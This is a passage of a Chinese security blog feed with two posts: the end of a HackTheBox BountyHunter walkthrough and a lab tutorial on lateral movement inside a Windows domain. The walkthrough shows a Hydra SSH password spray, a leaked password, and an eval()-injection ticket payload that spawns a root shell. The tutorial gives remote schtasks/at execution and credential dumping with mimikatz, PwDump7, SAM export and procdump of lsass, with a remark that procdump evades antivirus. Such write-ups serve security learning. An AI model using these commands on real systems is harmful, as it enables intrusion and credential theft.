class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">development:x:1000:1000:Development:/home/development:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# cut -d : -f 1 passwd.txt &gt; userword.txt</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# cat userword.txt                       </span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br><span class="line">sync</span><br><span class="line">games</span><br><span class="line">man</span><br><span class="line">lp</span><br><span class="line">mail</span><br><span class="line">news</span><br><span class="line">uucp</span><br><span class="line">proxy</span><br><span class="line">www-data</span><br><span class="line">backup</span><br><span class="line">list</span><br><span class="line">irc</span><br><span class="line">gnats</span><br><span class="line">nobody</span><br><span class="line">systemd-network</span><br><span class="line">systemd-resolve</span><br><span class="line">systemd-timesync</span><br><span class="line">messagebus</span><br><span class="line">syslog</span><br><span class="line">_apt</span><br><span class="line">tss</span><br><span class="line">uuidd</span><br><span class="line">tcpdump</span><br><span class="line">landscape</span><br><span class="line">pollinate</span><br><span class="line">sshd</span><br><span class="line">systemd-coredump</span><br><span class="line">development</span><br><span class="line">lxd</span><br><span class="line">usbmux</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# hydra -L userword.txt -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-15 01:55:59</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://10.10.11.100:22/</span><br><span class="line">[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-15 01:56:17</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ssh登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# ssh development@10.10.11.100</span><br><span class="line">The authenticity of host &#x27;10.10.11.100 (10.10.11.100)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.100&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">development@10.10.11.100&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 15 Aug 2021 05:39:27 AM UTC</span><br><span class="line"></span><br><span class="line">  System load:           0.0</span><br><span class="line">  Usage of /:            26.5% of 6.83GB</span><br><span class="line">  Memory usage:          35%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             266</span><br><span class="line">  Users logged in:       1</span><br><span class="line">  IPv4 address for eth0: 10.10.11.100</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:66fa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Aug 15 05:07:51 2021 from 10.10.16.38</span><br><span class="line">-bash-5.0$ pwd</span><br><span class="line">/home/development</span><br><span class="line">-bash-5.0$ ls</span><br><span class="line">code.md  contract.txt  exploit.md  readelf  strings  user.txt</span><br><span class="line">-bash-5.0$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">-bash-5.0$</span><br></pre></td></tr></table></figure><h2 id="0x08-提权"><a href="#0x08-提权" class="headerlink" title="0x08.提权"></a>0x08.提权</h2><p><code>sudo -l提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ sudo -l</span><br><span class="line">Matching Defaults entries for development on bountyhunter:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User development may run the following commands on bountyhunter:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">bash-5.0$ </span><br></pre></td></tr></table></figure><p><code>审计ticketValidator.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="number">-5.0</span>$ cat /opt/skytrain_inc/ticketValidator.py</span><br><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_file</span>(<span class="params">loc</span>):</span></span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> open(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate</span>(<span class="params">ticketFile</span>):</span></span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> enumerate(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            print(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>):</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> int(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:</span><br><span class="line">                validationNumber = eval(x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    fileName = input(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        print(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">bash<span class="number">-5.0</span>$ </span><br></pre></td></tr></table></figure><p><code>构建demo.md</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**10+10+__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)**</span><br></pre></td></tr></table></figure><p><code>或者</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**32+0+__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)**</span><br></pre></td></tr></table></figure><p><code>提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ pwd</span><br><span class="line">/tmp</span><br><span class="line">bash-5.0$ cat demo.md</span><br><span class="line"><span class="meta">#</span><span class="bash"> Skytrain Inc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Ticket to Lluna</span></span></span><br><span class="line">__Ticket Code:__</span><br><span class="line">**18+10+__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)**</span><br><span class="line">bash-5.0$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span><br><span class="line">Please enter the path to the ticket file.</span><br><span class="line">demo.md</span><br><span class="line">Destination: Lluna</span><br><span class="line">root@bountyhunter:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@bountyhunter:/tmp# cd</span><br><span class="line">root@bountyhunter:~# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@bountyhunter:~# cat root.txt </span><br><span class="line">******************************************</span><br><span class="line">root@bountyhunter:~# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/08/15/HTB-BountyHunter/image-20210814200854065.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-域内横向移动</title>
    <link href="https://lunamoore.github.io/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://lunamoore.github.io/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2021-08-14T05:32:08.000Z</published>
    <updated>2021-08-14T05:33:04.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Windows常用远程连接"><a href="#0x01-Windows常用远程连接" class="headerlink" title="0x01.Windows常用远程连接"></a>0x01.Windows常用远程连接</h2><h3 id="1-IPC"><a href="#1-IPC" class="headerlink" title="1.IPC"></a>1.IPC</h3><blockquote><p>利用条件，开启139、445端口，没有关闭默认共享</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;net use \\10.10.10.20\ipc$ &quot;11&quot; /user:administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;net use</span><br><span class="line">会记录新的网络连接。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">状态       本地        远程                      网络</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">OK                     \\10.10.10.20\ipc$        Microsoft Windows Network</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-windows自带工具获取信息"><a href="#2-windows自带工具获取信息" class="headerlink" title="2.windows自带工具获取信息"></a>2.windows自带工具获取信息</h3><blockquote><p>前提是建立ipc$连接</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;dir \\10.10.10.20\c$</span><br><span class="line"> 驱动器 \\10.10.10.20\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 AA35-C001</span><br><span class="line"></span><br><span class="line"> \\10.10.10.20\c$ 的目录</span><br><span class="line"></span><br><span class="line">2021/06/22  14:58         1,379,216 accesschk.exe</span><br><span class="line">2021/07/23  13:25            17,368 demo.ps1</span><br><span class="line">2021/07/29  13:29            13,672 Get-GPPPassword.ps1</span><br><span class="line">2021/07/13  17:11            38,616 nc.exe</span><br><span class="line">2021/07/16  19:18           133,120 netview.exe</span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2021/07/23  12:49            37,667 powercat.ps1</span><br><span class="line">2021/07/28  21:01           600,580 PowerUp.ps1</span><br><span class="line">2021/07/10  14:52    &lt;DIR&gt;          Program Files</span><br><span class="line">2021/07/16  18:04    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2016/06/28  09:49           170,160 PsLoggedon.exe</span><br><span class="line">2021/07/16  17:44            53,248 PVEFindADUser.exe</span><br><span class="line">2021/07/17  15:29           974,235 SharpHound.ps1</span><br><span class="line">2021/07/23  13:06            17,416 shell.ps1</span><br><span class="line">2021/07/27  17:52            16,663 Sherlock.ps1</span><br><span class="line">2021/07/11  11:27    &lt;DIR&gt;          Users</span><br><span class="line">2021/07/17  11:04    &lt;DIR&gt;          Windows</span><br><span class="line">              12 个文件      3,451,961 字节</span><br><span class="line">               5 个目录 51,462,012,928 可用字节</span><br></pre></td></tr></table></figure><h3 id="3-计划任务"><a href="#3-计划任务" class="headerlink" title="3.计划任务"></a>3.计划任务</h3><h4 id="01-at命令-server-2008之前"><a href="#01-at命令-server-2008之前" class="headerlink" title="01.at命令(server 2008之前)"></a>01.at命令(server 2008之前)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net time \\10.10.10.20    #查看系统时间</span><br><span class="line">copy calc.bat \\10.10.10.20\c$    #复制文件到目标系统（内容为calc.exe）</span><br><span class="line">at \\10.10.10.20 0:0AM c:\calc.bat    #创建计划任务</span><br><span class="line">at \\10.10.10.20 id /delete    #删除计划任务</span><br><span class="line">at \\10.10.10.20 0:0AM cmd.exe /c &quot;ipconfig &gt; c:/1.txt&quot;  #写入文件</span><br><span class="line">type \\10.10.10.20\c$\1.txt  #查看文件</span><br></pre></td></tr></table></figure><h4 id="02-schtasks命令-server-2008之后"><a href="#02-schtasks命令-server-2008之后" class="headerlink" title="02.schtasks命令(server 2008之后)"></a>02.schtasks命令(server 2008之后)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 10.10.10.20 /tn demo /sc onstart /tr c:\calc.bat /ru system /f  #创建一个demo计划任务</span><br><span class="line">schtasks /run /s 10.10.10.20 /i /tn &quot;demo&quot; #运行计划任务</span><br><span class="line">schtasks /delete /s 10.10.10.20 /tn &quot;demo&quot; /f #删除计划任务</span><br><span class="line">net use \\10.10.10.20\ipc$ /del /y  #删除ipc$连接</span><br></pre></td></tr></table></figure><h2 id="0x02-windows系统散列值获取"><a href="#0x02-windows系统散列值获取" class="headerlink" title="0x02.windows系统散列值获取"></a>0x02.windows系统散列值获取</h2><blockquote><p>LM Hash与NTLM Hash</p><p>LM Hash一共14位，server 2003以后使用NTLM Hash</p></blockquote><h3 id="1-Getpassword"><a href="#1-Getpassword" class="headerlink" title="1.Getpassword"></a>1.Getpassword</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Getpassword.exe</span><br><span class="line"></span><br><span class="line">Authentication Id:0;363018</span><br><span class="line">Authentication Package:Kerberos</span><br><span class="line">Primary User:Administrator</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: Administrator</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 11</span><br><span class="line"></span><br><span class="line">Authentication Id:0;997</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:LOCAL SERVICE</span><br><span class="line">Authentication Domain:NT AUTHORITY</span><br><span class="line"></span><br><span class="line">* User: </span><br><span class="line">* Domain: </span><br><span class="line">* Password: </span><br><span class="line"></span><br><span class="line">Authentication Id:0;996</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br><span class="line">Authentication Id:0;47004</span><br><span class="line">Authentication Package:NTLM</span><br><span class="line">Primary User:</span><br><span class="line">Authentication Domain:</span><br><span class="line"> (LUID ERROR) </span><br><span class="line"></span><br><span class="line">Authentication Id:0;999</span><br><span class="line">Authentication Package:Negotiate</span><br><span class="line">Primary User:WIN7DC1$</span><br><span class="line">Authentication Domain:JIYE</span><br><span class="line"></span><br><span class="line">* User: WIN7DC1$</span><br><span class="line">* Domain: JIYE</span><br><span class="line">* Password: 1G-\ K=Ae q-70DKy+%W7O:02&#x27;JrVV7P^w?A&amp;Po\R./j9TSdQp2tc1W);vJN9.Q5Qov9 -l;`H%W4xcb&gt;J.\m!n*x$bM2r4c`=*%)Mu&quot;8TaBkTM]%Q%IpQs8</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-PwDump7"><a href="#2-PwDump7" class="headerlink" title="2.PwDump7"></a>2.PwDump7</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PwDump7.exe</span><br><span class="line"></span><br><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">administration:1000:NO PASSWORD*********************:AE0597DC61A5C66B3A0600C60044C448:::</span><br></pre></td></tr></table></figure><h3 id="3-QuarksPwDump"><a href="#3-QuarksPwDump" class="headerlink" title="3.QuarksPwDump"></a>3.QuarksPwDump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -h</span><br></pre></td></tr></table></figure><h3 id="4-通过SAM和system文件获取密码"><a href="#4-通过SAM和system文件获取密码" class="headerlink" title="4.通过SAM和system文件获取密码"></a>4.通过SAM和system文件获取密码</h3><p>（1）导出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p>（2）mimikatz获取hash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive  #sam.hive与system.hive在mimikatz目录下</span><br></pre></td></tr></table></figure><p>（3）mimikatz直接获取本地SAM</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debugtoken::elevate  #提权至systemlsadump::sam  #获取本地SAMsekurlsa::logonpasswords  #获取明文密码NTLM Hash</span><br></pre></td></tr></table></figure><p>（4）minikatz在线读取SAM文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><h3 id="5-mimikatz离线读取lsass-dmp"><a href="#5-mimikatz离线读取lsass-dmp" class="headerlink" title="5.mimikatz离线读取lsass.dmp"></a>5.mimikatz离线读取lsass.dmp</h3><blockquote><p>lsass.exe进程里面含有明文密码与散列值</p><p>找到lsass.exe进程，右键创建储存文件即可导出</p></blockquote><p><strong>导出文件位置：C:\Users\administrator\AppData\Local\Temp\lsass.exe</strong></p><blockquote><p>也可以使用procdump.exe导出lsass.dmp文件，prodump为微软官方工具不会被查杀</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><code>mimikatz获取lsass.dmp中的散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 